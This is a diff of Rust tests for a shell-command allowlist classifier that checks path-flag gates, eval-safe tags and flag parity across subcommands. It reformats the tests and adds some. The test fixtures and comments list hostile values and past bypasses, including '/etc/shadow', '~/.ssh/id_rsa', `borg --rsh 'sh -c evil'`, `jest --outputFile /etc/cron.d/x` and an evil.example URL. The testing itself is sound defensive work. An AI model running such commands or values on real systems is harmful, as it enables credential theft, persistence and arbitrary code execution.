-    // extra "is this tagged eval-safe" check on top.
-    //
-    // So a property like "walker accept => dispatcher accept" is
-    // neither true (walker may accept token sequences the
-    // dispatcher denies, like `cmd init a a` exceeding
-    // max_positional) nor required for safety. The
-    // `eval_verdict.combine(word_sub_verdict)` composition is what
-    // guarantees end-to-end safety. We test that composition via the
-    // `eval_*` tests in `src/tests.rs`, not here.
+// H2 (clarification): the walker is intentionally INDEPENDENT of
+// dispatcher constraints like max_positional. Eval-safety is
+// gated end-to-end by `cst/check.rs::eval_verdict`, which runs
+// `word_sub_verdict` (full dispatcher validation) BEFORE the
+// walker. By the time the walker runs, the dispatcher has
+// already accepted the invocation. The walker only adds the
+// extra "is this tagged eval-safe" check on top.
+//
+// So a property like "walker accept => dispatcher accept" is
+// neither true (walker may accept token sequences the
+// dispatcher denies, like `cmd init a a` exceeding
+// max_positional) nor required for safety. The
+// `eval_verdict.combine(word_sub_verdict)` composition is what
+// guarantees end-to-end safety. We test that composition via the
+// `eval_*` tests in `src/tests.rs`, not here.
 
-    /// H4: an unrecognized field inside a matrix block (e.g. a
-    /// contributor putting `eval_safe = true` directly on a matrix
-    /// action) fails at TOML parse time rather than silently doing
-    /// nothing. eval-safe tagging lives on TOML-declared subs, never
-    /// on matrix actions — but the schema previously accepted
-    /// arbitrary extra fields and dropped them.
-    #[test]
-    fn matrix_unknown_field_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+/// H4: an unrecognized field inside a matrix block (e.g. a
+/// contributor putting `eval_safe = true` directly on a matrix
+/// action) fails at TOML parse time rather than silently doing
+/// nothing. eval-safe tagging lives on TOML-declared subs, never
+/// on matrix actions — but the schema previously accepted
+/// arbitrary extra fields and dropped them.
+#[test]
+fn matrix_unknown_field_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
                 [[command]]
                 name = "demo"
                 handler = "php"
@@ -6581,15 +6221,17 @@ valued = ["--type"]
                 actions.foo = "p1"
                 [command.handler_policy.p1]
                 standalone = ["--x"]
-            "#);
-        });
-        assert!(result.is_err(), "matrix block with eval_safe should panic at parse time");
-    }
+            "#,
+        );
+    });
+    assert!(result.is_err(), "matrix block with eval_safe should panic at parse time");
+}
 
-    #[test]
-    fn matrix_action_detailed_unknown_field_rejected() {
-        let result = std::panic::catch_unwind(|| {
-            load_one(r#"
+#[test]
+fn matrix_action_detailed_unknown_field_rejected() {
+    let result = std::panic::catch_unwind(|| {
+        load_one(
+            r#"
                 [[command]]
                 name = "demo"
                 handler = "php"
@@ -6600,813 +6242,743 @@ valued = ["--type"]
                 actions.foo = { policy = "p1", eval_safe = true }
                 [command.handler_policy.p1]
                 standalone = ["--x"]
-            "#);
-        });
-        assert!(result.is_err(), "matrix action with eval_safe should panic at parse time");
+            "#,
+        );
+    });
+    assert!(result.is_err(), "matrix action with eval_safe should panic at parse time");
+}
+
+/// Conservation law for the legacy path-gate: a command exposing a flag whose NAME is
+/// unambiguously a filesystem path (`--outfile`, `--keyout`, `--password-file`, …) must
+/// declare that flag's read/write role — in its own `[command.path_gate]` or a central
+/// `pathgates.toml [roles.X]` — so it can't read/write an arbitrary system/secret path
+/// ungated. The ambiguous `-o`/`--output` set (usually an output FORMAT, not a path) is out
+/// of scope BY DESIGN: no static rule tells `-o file` from `-o json`, so those rely on
+/// adversarial review + co-located annotation. Adding an unambiguous flag name below, or a
+/// new command that exposes one without a role, turns this test red.
+#[test]
+fn every_unambiguous_path_flag_declares_a_role() {
+    use super::types::{TomlFile, TomlSub};
+
+    const PATH_FLAG_NAMES: &[&str] = &[
+        "--outfile", "--output-file", "--output-dir", "--output-path", "--dest-dir", "--destination", "--infile", "--input-file",
+        "--load-privkey", "--load-certificate", "--load-pubkey", "--load-ca-certificate", "--load-request", "--pskfile", "--password-file",
+        "--cacert", "--keyout", "--tls-client-cert", "--key-file", "--cert-file", "--ca-file",
+        // Single-dash Go-style spellings (mkcert `-cert-file`): the same name, one dash. A
+        // Go tool accepts both, so an undeclared single-dash path flag is a live bypass.
+        "-outfile", "-output-file", "-output-dir", "-output-path", "-dest-dir", "-destination", "-infile", "-input-file", "-pskfile",
+        "-password-file", "-cacert", "-keyout", "-tls-client-cert", "-key-file", "-cert-file", "-ca-file",
+        // camelCase output-path spellings (jest `--outputFile`): the hyphenated list above
+        // missed these, so `jest --outputFile /etc/cron.d/x` was an ungated out-of-workspace
+        // write until this row forced the gate. Any new command with one of these must gate it.
+        "--outputFile", "--outputDir", "--outFile",
+    ];
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for entry in std::fs::read_dir(dir).unwrap() {
+            let path = entry.unwrap().path();
+            if path.is_dir() {
+                toml_files(&path, out);
+            } else if path.extension().is_some_and(|e| e == "toml") {
+                out.push(path);
+            }
+        }
     }
 
-    /// Conservation law for the legacy path-gate: a command exposing a flag whose NAME is
-    /// unambiguously a filesystem path (`--outfile`, `--keyout`, `--password-file`, …) must
-    /// declare that flag's read/write role — in its own `[command.path_gate]` or a central
-    /// `pathgates.toml [roles.X]` — so it can't read/write an arbitrary system/secret path
-    /// ungated. The ambiguous `-o`/`--output` set (usually an output FORMAT, not a path) is out
-    /// of scope BY DESIGN: no static rule tells `-o file` from `-o json`, so those rely on
-    /// adversarial review + co-located annotation. Adding an unambiguous flag name below, or a
-    /// new command that exposes one without a role, turns this test red.
-    #[test]
-    fn every_unambiguous_path_flag_declares_a_role() {
-        use super::types::{TomlFile, TomlSub};
+    // Every `valued` flag on a command and its (nested) subs — a path flag may sit on a sub.
+    fn collect_flags<'a>(valued: &'a [String], subs: &'a [TomlSub], out: &mut Vec<&'a str>) {
+        out.extend(valued.iter().map(String::as_str));
+        for s in subs {
+            collect_flags(&s.valued, &s.sub, out);
+        }
+    }
 
-        const PATH_FLAG_NAMES: &[&str] = &[
-            "--outfile", "--output-file", "--output-dir", "--output-path",
-            "--dest-dir", "--destination", "--infile", "--input-file",
-            "--load-privkey", "--load-certificate", "--load-pubkey",
-            "--load-ca-certificate", "--load-request", "--pskfile",
-            "--password-file", "--cacert", "--keyout", "--tls-client-cert",
-            "--key-file", "--cert-file", "--ca-file",
-            // Single-dash Go-style spellings (mkcert `-cert-file`): the same name, one dash. A
-            // Go tool accepts both, so an undeclared single-dash path flag is a live bypass.
-            "-outfile", "-output-file", "-output-dir", "-output-path",
-            "-dest-dir", "-destination", "-infile", "-input-file",
-            "-pskfile", "-password-file", "-cacert", "-keyout",
-            "-tls-client-cert", "-key-file", "-cert-file", "-ca-file",
-            // camelCase output-path spellings (jest `--outputFile`): the hyphenated list above
-            // missed these, so `jest --outputFile /etc/cron.d/x` was an ungated out-of-workspace
-            // write until this row forced the gate. Any new command with one of these must gate it.
-            "--outputFile", "--outputDir", "--outFile",
-        ];
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for entry in std::fs::read_dir(dir).unwrap() {
-                let path = entry.unwrap().path();
-                if path.is_dir() {
-                    toml_files(&path, out);
-                } else if path.extension().is_some_and(|e| e == "toml") {
-                    out.push(path);
+    let mut failures = Vec::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).unwrap();
+        let parsed: TomlFile = toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
+        for cmd in &parsed.command {
+            let mut flags = Vec::new();
+            collect_flags(&cmd.valued, &cmd.sub, &mut flags);
+            for f in flags {
+                if !PATH_FLAG_NAMES.contains(&f) {
+                    continue;
+                }
+                let covered = cmd.path_gate.as_ref().is_some_and(|pg| pg.declares_flag(f))
+                    || crate::pathgate::central_role_declares_flag(&cmd.name, f);
+                if !covered {
+                    failures.push(format!("  {} — flag `{f}` (in {})", cmd.name, file.file_name().unwrap().to_string_lossy()));
                 }
             }
         }
-
-        // Every `valued` flag on a command and its (nested) subs — a path flag may sit on a sub.
-        fn collect_flags<'a>(valued: &'a [String], subs: &'a [TomlSub], out: &mut Vec<&'a str>) {
-            out.extend(valued.iter().map(String::as_str));
-            for s in subs {
-                collect_flags(&s.valued, &s.sub, out);
-            }
-        }
-
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-
-        let mut failures = Vec::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).unwrap();
-            let parsed: TomlFile =
-                toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
-            for cmd in &parsed.command {
-                let mut flags = Vec::new();
-                collect_flags(&cmd.valued, &cmd.sub, &mut flags);
-                for f in flags {
-                    if !PATH_FLAG_NAMES.contains(&f) {
-                        continue;
-                    }
-                    let covered = cmd.path_gate.as_ref().is_some_and(|pg| pg.declares_flag(f))
-                        || crate::pathgate::central_role_declares_flag(&cmd.name, f);
-                    if !covered {
-                        failures.push(format!(
-                            "  {} — flag `{f}` (in {})",
-                            cmd.name,
-                            file.file_name().unwrap().to_string_lossy()
-                        ));
-                    }
-                }
-            }
-        }
-        assert!(
-            failures.is_empty(),
-            "commands with an unambiguous path flag but no declared path-gate role — add \
+    }
+    assert!(
+        failures.is_empty(),
+        "commands with an unambiguous path flag but no declared path-gate role — add \
              `[command.path_gate]` with the flag's read/write role (see SAMPLE.toml):\n{}",
-            failures.join("\n"),
-        );
+        failures.join("\n"),
+    );
+}
+
+/// One `eval_safe`-tagged leaf in the registry, with the flag sets that decide whether an
+/// invocation of it stays eval-safe.
+struct Leaf {
+    path: Vec<String>,
+    flags: Vec<String>,
+    required: Vec<String>,
+    require_any: Vec<String>,
+    has_values: bool,
+    standalone: Vec<String>,
+}
+
+/// Every eval-safe leaf, found by walking `commands/**/*.toml` so a newly tagged command is
+/// covered without anyone adding a case. Split out of the test itself only for size — the
+/// collection is mechanical, and the guard worth reading is what the test does with it.
+fn eval_safe_leaves() -> Vec<Leaf> {
+    use super::types::{TomlFile, TomlSub};
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).unwrap() {
+            let p = e.unwrap().path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    /// One `eval_safe`-tagged leaf in the registry, with the flag sets that decide whether an
-    /// invocation of it stays eval-safe.
-    struct Leaf {
-        path: Vec<String>,
-        flags: Vec<String>,
-        required: Vec<String>,
-        require_any: Vec<String>,
+    #[allow(clippy::too_many_arguments)]
+    fn walk(
+        path: &mut Vec<String>,
+        standalone: &[String],
+        eval_safe: Option<bool>,
+        flags: &[String],
+        required: &[String],
+        require_any: &[String],
         has_values: bool,
-        standalone: Vec<String>,
+        subs: &[TomlSub],
+        out: &mut Vec<Leaf>,
+    ) {
+        if eval_safe == Some(true) {
+            out.push(Leaf {
+                path: path.clone(),
+                flags: flags.to_vec(),
+                required: required.to_vec(),
+                require_any: require_any.to_vec(),
+                has_values,
+                standalone: standalone.to_vec(),
+            });
+        }
+        for s in subs {
+            path.push(s.name.clone());
+            walk(
+                path,
+                &s.standalone,
+                s.eval_safe,
+                &s.eval_safe_flags,
+                &s.eval_safe_required_flags,
+                &s.require_any,
+                !s.eval_safe_flag_values.is_empty(),
+                &s.sub,
+                out,
+            );
+            path.pop();
+        }
     }
 
-    /// Every eval-safe leaf, found by walking `commands/**/*.toml` so a newly tagged command is
-    /// covered without anyone adding a case. Split out of the test itself only for size — the
-    /// collection is mechanical, and the guard worth reading is what the test does with it.
-    fn eval_safe_leaves() -> Vec<Leaf> {
-        use super::types::{TomlFile, TomlSub};
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+    let mut leaves = Vec::new();
+    for file in &files {
+        let src = std::fs::read_to_string(file).unwrap();
+        let parsed: TomlFile = toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
+        for cmd in &parsed.command {
+            let mut path = vec![cmd.name.clone()];
+            walk(
+                &mut path,
+                &cmd.standalone,
+                cmd.eval_safe,
+                &cmd.eval_safe_flags,
+                &cmd.eval_safe_required_flags,
+                &cmd.require_any,
+                !cmd.eval_safe_flag_values.is_empty(),
+                &cmd.sub,
+                &mut leaves,
+            );
+        }
+    }
+    leaves
+}
 
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).unwrap() {
-                let p = e.unwrap().path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
+/// Behavioral guard over EVERY real `eval_safe` tag (the other eval_safe tests are build-time
+/// schema checks on synthetic TOMLs). For each tag: (a) it TAKES EFFECT — `eval "$(cmd …)"` in
+/// canonical form is allowed; and (b) it STAYS TIGHT — a flag the command itself accepts but that
+/// is NOT in `eval_safe_flags` must break eval-safety (else the tag rubber-stamps everything).
+/// Skips leaves needing a positional or a `eval_safe_flag_values` value we can't synthesize
+/// (those bare forms aren't self-sufficiently eval-safe — e.g. `aws … export-credentials` whose
+/// default `--format` is JSON, or `starship init <shell>`). Auto-covers every future tag.
+#[test]
+fn every_eval_safe_tag_takes_effect_and_stays_tight() {
+    use crate::is_safe_command;
+
+    let leaves = eval_safe_leaves();
+    assert!(!leaves.is_empty(), "expected the registry to contain eval_safe tags");
+
+    const HELP: &[&str] = &["--help", "-h", "--version", "-V"];
+    let mut failures = Vec::new();
+    for leaf in &leaves {
+        // Build the canonical eval-safe invocation: path + a required flag + an eval-safe
+        // `require_any` token (the `init -` shape: bare `jenv init` is denied by require_any, so
+        // the canonical must carry `-`). If require_any has no eval-safe member, no invocation can
+        // be both valid and eval-safe — skip rather than false-fail.
+        let mut tokens = leaf.path.clone();
+        let mut buildable = true;
+        if let Some(rf) = leaf.required.first() {
+            tokens.push(rf.clone());
+        }
+        if !leaf.require_any.is_empty() {
+            match leaf.require_any.iter().find(|t| leaf.flags.contains(t) || leaf.required.contains(t)) {
+                Some(ra) if !tokens.contains(ra) => tokens.push(ra.clone()),
+                Some(_) => {}
+                None => buildable = false,
+            }
+        }
+        if !buildable {
+            // require_any forces a token to be present for validity, but none of those tokens is
+            // eval-safe — so no invocation is ever both valid AND eval-safe. The tag is dead.
+            failures.push(format!(
+                "dead tag: `{}` requires one of {:?} to be valid, but none is in eval_safe_flags — eval-safety can never take effect",
+                leaf.path.join(" "),
+                leaf.require_any,
+            ));
+            continue;
+        }
+        let canonical = tokens.join(" ");
+        // (a) TAKES EFFECT — only when canonical is a self-sufficient shell-init command (no
+        // value-gated flag needed, and the bare form is itself a valid command).
+        if !leaf.has_values && is_safe_command(&canonical) {
+            let eval_line = format!("eval \"$({canonical})\"");
+            if !is_safe_command(&eval_line) {
+                failures.push(format!("tag has no effect: `{eval_line}` denied though `{canonical}` is allowed"));
+            }
+        }
+        // (b) STAYS TIGHT — a flag the command accepts but that isn't eval-safe breaks it.
+        if let Some(poison) = leaf
+            .standalone
+            .iter()
+            .find(|f| !leaf.flags.contains(f) && !leaf.required.contains(f) && !HELP.contains(&f.as_str()))
+        {
+            let poison_cmd = format!("{canonical} {poison}");
+            if is_safe_command(&poison_cmd) {
+                let eval_poison = format!("eval \"$({poison_cmd})\"");
+                if is_safe_command(&eval_poison) {
+                    failures.push(format!("allowlist not tight: `{eval_poison}` allowed but `{poison}` isn't in eval_safe_flags"));
                 }
             }
         }
+    }
+    assert!(failures.is_empty(), "eval_safe behavioral guard:\n{}", failures.join("\n"));
+}
 
-        #[allow(clippy::too_many_arguments)]
-        fn walk(
-            path: &mut Vec<String>,
-            standalone: &[String],
-            eval_safe: Option<bool>,
-            flags: &[String],
-            required: &[String],
-            require_any: &[String],
-            has_values: bool,
-            subs: &[TomlSub],
-            out: &mut Vec<Leaf>,
-        ) {
-            if eval_safe == Some(true) {
-                out.push(Leaf {
-                    path: path.clone(),
-                    flags: flags.to_vec(),
-                    required: required.to_vec(),
-                    require_any: require_any.to_vec(),
-                    has_values,
-                    standalone: standalone.to_vec(),
-                });
-            }
-            for s in subs {
-                path.push(s.name.clone());
-                walk(
-                    path,
-                    &s.standalone,
-                    s.eval_safe,
-                    &s.eval_safe_flags,
-                    &s.eval_safe_required_flags,
-                    &s.require_any,
-                    !s.eval_safe_flag_values.is_empty(),
-                    &s.sub,
-                    out,
-                );
-                path.pop();
-            }
-        }
+/// Flag parity across subcommand FAMILIES — sibling subs that genuinely share a core flag set
+/// must ALL accept every flag in it, so one sub's list can't silently drift from the others.
+/// Dogfooding found `cargo doc/build/bench --workspace` denied exactly this way. Adding a family
+/// row LOCKS that family against future drift (even families with no current bug — go/kubectl were
+/// already consistent, so pinning them keeps them so). Each (family, flag) is verified against the
+/// live classifier; only add a row/flag that is genuinely shared by every listed sub, or the guard
+/// false-fails. To EXTEND: append a `Family`, run the test, and treat any failure as a real drift
+/// bug (fix the TOML) unless the flag isn't actually universal (then it doesn't belong in the row).
+#[test]
+fn subcommand_families_share_core_flags() {
+    use crate::is_safe_command;
 
-        let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
-        let mut files = Vec::new();
-        toml_files(&root, &mut files);
-        let mut leaves = Vec::new();
-        for file in &files {
-            let src = std::fs::read_to_string(file).unwrap();
-            let parsed: TomlFile =
-                toml::from_str(&src).unwrap_or_else(|e| panic!("{}: {e}", file.display()));
-            for cmd in &parsed.command {
-                let mut path = vec![cmd.name.clone()];
-                walk(
-                    &mut path,
-                    &cmd.standalone,
-                    cmd.eval_safe,
-                    &cmd.eval_safe_flags,
-                    &cmd.eval_safe_required_flags,
-                    &cmd.require_any,
-                    !cmd.eval_safe_flag_values.is_empty(),
-                    &cmd.sub,
-                    &mut leaves,
-                );
-            }
-        }
-        leaves
+    struct Family {
+        command: &'static str,
+        subs: &'static [&'static str],
+        standalone: &'static [&'static str],
+        valued: &'static [(&'static str, &'static str)],
     }
 
-    /// Behavioral guard over EVERY real `eval_safe` tag (the other eval_safe tests are build-time
-    /// schema checks on synthetic TOMLs). For each tag: (a) it TAKES EFFECT — `eval "$(cmd …)"` in
-    /// canonical form is allowed; and (b) it STAYS TIGHT — a flag the command itself accepts but that
-    /// is NOT in `eval_safe_flags` must break eval-safety (else the tag rubber-stamps everything).
-    /// Skips leaves needing a positional or a `eval_safe_flag_values` value we can't synthesize
-    /// (those bare forms aren't self-sufficiently eval-safe — e.g. `aws … export-credentials` whose
-    /// default `--format` is JSON, or `starship init <shell>`). Auto-covers every future tag.
-    #[test]
-    fn every_eval_safe_tag_takes_effect_and_stays_tight() {
-        use crate::is_safe_command;
+    const FAMILIES: &[Family] = &[
+        // cargo's build-and-analyze subs share package-selection + compile flags. Excluded:
+        // `run` (executes the built binary — intentionally code-exec-restricted) and `fix`
+        // (rewrites source; not a sub).
+        Family {
+            command: "cargo",
+            subs: &["build", "check", "test", "doc", "clippy", "bench"],
+            standalone: &[
+                "--workspace", "--all", "--release", "--offline", "--locked", "--frozen", "--all-features", "--no-default-features",
+            ],
+            valued: &[
+                ("--features", "foo"),
+                ("--target", "x86_64-unknown-linux-gnu"),
+                ("--profile", "dev"),
+                ("--manifest-path", "Cargo.toml"),
+            ],
+        },
+        // go build/test/vet share the build/module knobs (single-dash, value by space or `=`).
+        Family { command: "go", subs: &["build", "test", "vet"], standalone: &["-v", "-x", "-n"], valued: &[("-tags", "foo")] },
+        // .NET's build-family subs share configuration/restore knobs. (`run` executes — excluded.)
+        Family {
+            command: "dotnet",
+            subs: &["build", "test", "publish"],
+            standalone: &["--no-restore", "--nologo"],
+            valued: &[("--configuration", "Release"), ("--framework", "net8.0")],
+        },
+        // swift build/test share the configuration selector. (`run` executes — excluded.)
+        Family {
+            command: "swift",
+            subs: &["build", "test"],
+            standalone: &[],
+            valued: &[("-c", "release"), ("--configuration", "release")],
+        },
+        // OpenTofu's LOCAL read/format subs share `-no-color`. (`plan`/`apply` reach remote state
+        // and are intentionally gated — not part of this family.)
+        Family { command: "tofu", subs: &["validate", "show", "fmt"], standalone: &["-no-color"], valued: &[] },
+    ];
 
-        let leaves = eval_safe_leaves();
-        assert!(!leaves.is_empty(), "expected the registry to contain eval_safe tags");
-
-        const HELP: &[&str] = &["--help", "-h", "--version", "-V"];
-        let mut failures = Vec::new();
-        for leaf in &leaves {
-            // Build the canonical eval-safe invocation: path + a required flag + an eval-safe
-            // `require_any` token (the `init -` shape: bare `jenv init` is denied by require_any, so
-            // the canonical must carry `-`). If require_any has no eval-safe member, no invocation can
-            // be both valid and eval-safe — skip rather than false-fail.
-            let mut tokens = leaf.path.clone();
-            let mut buildable = true;
-            if let Some(rf) = leaf.required.first() {
-                tokens.push(rf.clone());
-            }
-            if !leaf.require_any.is_empty() {
-                match leaf
-                    .require_any
-                    .iter()
-                    .find(|t| leaf.flags.contains(t) || leaf.required.contains(t))
-                {
-                    Some(ra) if !tokens.contains(ra) => tokens.push(ra.clone()),
-                    Some(_) => {}
-                    None => buildable = false,
+    let mut failures = Vec::new();
+    for fam in FAMILIES {
+        for sub in fam.subs {
+            for f in fam.standalone {
+                let cmd = format!("{} {sub} {f}", fam.command);
+                if !is_safe_command(&cmd) {
+                    failures.push(cmd);
                 }
             }
-            if !buildable {
-                // require_any forces a token to be present for validity, but none of those tokens is
-                // eval-safe — so no invocation is ever both valid AND eval-safe. The tag is dead.
-                failures.push(format!(
-                    "dead tag: `{}` requires one of {:?} to be valid, but none is in eval_safe_flags — eval-safety can never take effect",
-                    leaf.path.join(" "),
-                    leaf.require_any,
-                ));
-                continue;
-            }
-            let canonical = tokens.join(" ");
-            // (a) TAKES EFFECT — only when canonical is a self-sufficient shell-init command (no
-            // value-gated flag needed, and the bare form is itself a valid command).
-            if !leaf.has_values && is_safe_command(&canonical) {
-                let eval_line = format!("eval \"$({canonical})\"");
-                if !is_safe_command(&eval_line) {
-                    failures.push(format!(
-                        "tag has no effect: `{eval_line}` denied though `{canonical}` is allowed"
-                    ));
-                }
-            }
-            // (b) STAYS TIGHT — a flag the command accepts but that isn't eval-safe breaks it.
-            if let Some(poison) = leaf.standalone.iter().find(|f| {
-                !leaf.flags.contains(f) && !leaf.required.contains(f) && !HELP.contains(&f.as_str())
-            }) {
-                let poison_cmd = format!("{canonical} {poison}");
-                if is_safe_command(&poison_cmd) {
-                    let eval_poison = format!("eval \"$({poison_cmd})\"");
-                    if is_safe_command(&eval_poison) {
-                        failures.push(format!(
-                            "allowlist not tight: `{eval_poison}` allowed but `{poison}` isn't in eval_safe_flags"
-                        ));
-                    }
+            for (f, v) in fam.valued {
+                let cmd = format!("{} {sub} {f} {v}", fam.command);
+                if !is_safe_command(&cmd) {
+                    failures.push(cmd);
                 }
             }
         }
-        assert!(failures.is_empty(), "eval_safe behavioral guard:\n{}", failures.join("\n"));
+    }
+    assert!(failures.is_empty(), "subcommand family flag drift — a sub is missing a flag its siblings share:\n  {}", failures.join("\n  "),);
+}
+
+/// The pre-filter must never hide a denial from the gate.
+///
+/// `should_deny` runs the role's judge only on values that clear a pre-filter — a POSITIVE
+/// shape test (`looks_like_path`, plus whitespace, plus substitutions). Anything whose shape it
+/// does not recognize is skipped, unjudged, and therefore approved. That is fail-OPEN by
+/// construction in a program that is otherwise allowlist-only, and it has now bitten three
+/// times, each time as a new shape:
+///
+///   - `borg --rsh 'sh -c evil'`  — whitespace: a command line, not a path
+///   - `borg --rsh file:~`        — a colon with no `/` or `.`
+///   - substitution / `$VAR` values, patched earlier for the same reason
+///
+/// Each was found by a different accident. So this asserts the INVARIANT instead of the
+/// instances: for every declared gate, the gate's answer must equal the judge's answer. The
+/// pre-filter is the only thing that can break that equality, so any shape it fails to
+/// recognize shows up here without anyone having to think of it first.
+#[test]
+fn the_pre_filter_never_hides_a_denial_from_a_declared_gate() {
+    use super::types::TomlFile;
+    use crate::pathgate::Role;
+
+    fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
+        for e in std::fs::read_dir(dir).unwrap() {
+            let p = e.unwrap().path();
+            if p.is_dir() {
+                toml_files(&p, out);
+            } else if p.extension().is_some_and(|x| x == "toml") {
+                out.push(p);
+            }
+        }
     }
 
-    /// Flag parity across subcommand FAMILIES — sibling subs that genuinely share a core flag set
-    /// must ALL accept every flag in it, so one sub's list can't silently drift from the others.
-    /// Dogfooding found `cargo doc/build/bench --workspace` denied exactly this way. Adding a family
-    /// row LOCKS that family against future drift (even families with no current bug — go/kubectl were
-    /// already consistent, so pinning them keeps them so). Each (family, flag) is verified against the
-    /// live classifier; only add a row/flag that is genuinely shared by every listed sub, or the guard
-    /// false-fails. To EXTEND: append a `Family`, run the test, and treat any failure as a real drift
-    /// bug (fix the TOML) unless the flag isn't actually universal (then it doesn't belong in the row).
-    #[test]
-    fn subcommand_families_share_core_flags() {
-        use crate::is_safe_command;
+    // Deliberately mixed: paths that look like paths, and values that do not. The second group
+    // is the point — every historical miss lived there.
+    const VALUES: &[&str] = &[
+        "/etc/shadow", "~/.ssh/id_rsa", "/tmp/sc-probe/x", "./ok.txt", "out.txt", "sh -c evil", "ssh -p 2222", "file:~", "fiLe:~", "abc:~",
+        "x:/tmp/evil", "http://evil.example/x", "https://evil.example/x", "ssh://evil/x", "*.sh", "$VAR", "-", "../../etc/shadow",
+    ];
 
-        struct Family {
-            command: &'static str,
-            subs: &'static [&'static str],
-            standalone: &'static [&'static str],
-            valued: &'static [(&'static str, &'static str)],
-        }
-
-        const FAMILIES: &[Family] = &[
-            // cargo's build-and-analyze subs share package-selection + compile flags. Excluded:
-            // `run` (executes the built binary — intentionally code-exec-restricted) and `fix`
-            // (rewrites source; not a sub).
-            Family {
-                command: "cargo",
-                subs: &["build", "check", "test", "doc", "clippy", "bench"],
-                standalone: &[
-                    "--workspace", "--all", "--release", "--offline", "--locked", "--frozen",
-                    "--all-features", "--no-default-features",
-                ],
-                valued: &[
-                    ("--features", "foo"),
-                    ("--target", "x86_64-unknown-linux-gnu"),
-                    ("--profile", "dev"),
-                    ("--manifest-path", "Cargo.toml"),
-                ],
-            },
-            // go build/test/vet share the build/module knobs (single-dash, value by space or `=`).
-            Family {
-                command: "go",
-                subs: &["build", "test", "vet"],
-                standalone: &["-v", "-x", "-n"],
-                valued: &[("-tags", "foo")],
-            },
-            // .NET's build-family subs share configuration/restore knobs. (`run` executes — excluded.)
-            Family {
-                command: "dotnet",
-                subs: &["build", "test", "publish"],
-                standalone: &["--no-restore", "--nologo"],
-                valued: &[("--configuration", "Release"), ("--framework", "net8.0")],
-            },
-            // swift build/test share the configuration selector. (`run` executes — excluded.)
-            Family {
-                command: "swift",
-                subs: &["build", "test"],
-                standalone: &[],
-                valued: &[("-c", "release"), ("--configuration", "release")],
-            },
-            // OpenTofu's LOCAL read/format subs share `-no-color`. (`plan`/`apply` reach remote state
-            // and are intentionally gated — not part of this family.)
-            Family {
-                command: "tofu",
-                subs: &["validate", "show", "fmt"],
-                standalone: &["-no-color"],
-                valued: &[],
-            },
-        ];
-
-        let mut failures = Vec::new();
-        for fam in FAMILIES {
-            for sub in fam.subs {
-                for f in fam.standalone {
-                    let cmd = format!("{} {sub} {f}", fam.command);
-                    if !is_safe_command(&cmd) {
-                        failures.push(cmd);
-                    }
-                }
-                for (f, v) in fam.valued {
-                    let cmd = format!("{} {sub} {f} {v}", fam.command);
-                    if !is_safe_command(&cmd) {
-                        failures.push(cmd);
-                    }
+    let mut gates: Vec<(String, String, Role)> = crate::pathgate::central_flag_gates();
+    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("commands");
+    let mut files = Vec::new();
+    toml_files(&root, &mut files);
+    for file in &files {
+        let src = std::fs::read_to_string(file).unwrap();
+        let parsed: TomlFile = toml::from_str(&src).unwrap();
+        for cmd in &parsed.command {
+            if let Some(pg) = &cmd.path_gate {
+                for (f, r) in pg.flag_roles() {
+                    gates.push((cmd.name.clone(), f.to_string(), r));
                 }
             }
         }
-        assert!(
-            failures.is_empty(),
-            "subcommand family flag drift — a sub is missing a flag its siblings share:\n  {}",
-            failures.join("\n  "),
-        );
     }
 
-    /// The pre-filter must never hide a denial from the gate.
-    ///
-    /// `should_deny` runs the role's judge only on values that clear a pre-filter — a POSITIVE
-    /// shape test (`looks_like_path`, plus whitespace, plus substitutions). Anything whose shape it
-    /// does not recognize is skipped, unjudged, and therefore approved. That is fail-OPEN by
-    /// construction in a program that is otherwise allowlist-only, and it has now bitten three
-    /// times, each time as a new shape:
-    ///
-    ///   - `borg --rsh 'sh -c evil'`  — whitespace: a command line, not a path
-    ///   - `borg --rsh file:~`        — a colon with no `/` or `.`
-    ///   - substitution / `$VAR` values, patched earlier for the same reason
-    ///
-    /// Each was found by a different accident. So this asserts the INVARIANT instead of the
-    /// instances: for every declared gate, the gate's answer must equal the judge's answer. The
-    /// pre-filter is the only thing that can break that equality, so any shape it fails to
-    /// recognize shows up here without anyone having to think of it first.
-    #[test]
-    fn the_pre_filter_never_hides_a_denial_from_a_declared_gate() {
-        use super::types::TomlFile;
-        use crate::pathgate::Role;
-
-        fn toml_files(dir: &std::path::Path, out: &mut Vec<std::path::PathBuf>) {
-            for e in std::fs::read_dir(dir).unwrap() {
-                let p = e.unwrap().path();
-                if p.is_dir() {
-                    toml_files(&p, out);
-                } else if p.extension().is_some_and(|x| x == "toml") {
-                    out.push(p);
-                }
+    let mut failures = Vec::new();
+    let mut checked = 0usize;
+    for (cmd, flag, role) in gates {
+        let judge = match role {
+            Role::Ignore => continue,
+            Role::Read => crate::engine::resolve::read_content_verdict,
+            Role::ReadTree => crate::engine::resolve::read_tree_verdict,
